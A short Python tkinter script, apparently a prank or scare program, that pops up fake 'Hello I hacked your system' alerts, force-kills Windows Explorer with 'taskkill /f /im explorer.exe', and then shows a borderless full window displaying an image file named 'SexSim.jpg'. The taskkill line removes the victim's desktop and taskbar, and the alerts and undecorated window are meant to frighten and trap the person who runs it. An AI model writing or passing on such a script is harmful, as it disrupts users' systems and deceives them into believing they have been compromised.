import tkinter.messagebox
from tkinter import *
from PIL import ImageTk, Image
import os

root = Tk()

def alert(title, message, kind='info', hidemain=True):
    if kind not in ('error', 'warning', 'info'):
        raise ValueError('Unsupported alert kind.')

    show_method = getattr(tkinter.messagebox, 'show{}'.format(kind))
    show_method(title, message)

if __name__ == '__main__':
    Tk().withdraw()
    alert('Hacked', ' Hello I hacked your system')
    alert('NULL', 'Im going to show you something weird now', kind='warning')

class DupeWindow:
    def __init__(self, parent):
        parent.geometry('1280x720')
        root.title("NULL")
        root.configure(bg='lightgray')

        ico = Image.open('Wheel.jpg')
        photo = ImageTk.PhotoImage(ico)
        root.wm_iconphoto(False, photo)

        path = "SexSim.jpg"
        img = ImageTk.PhotoImage(Image.open(path))
        panel = Label(root, image=img)
        panel.photo = img
        panel.grid(column=2,row=2)
        root.overrideredirect(True)

os.system('taskkill /f /im explorer.exe')

DupeWindow(root)
root.mainloop()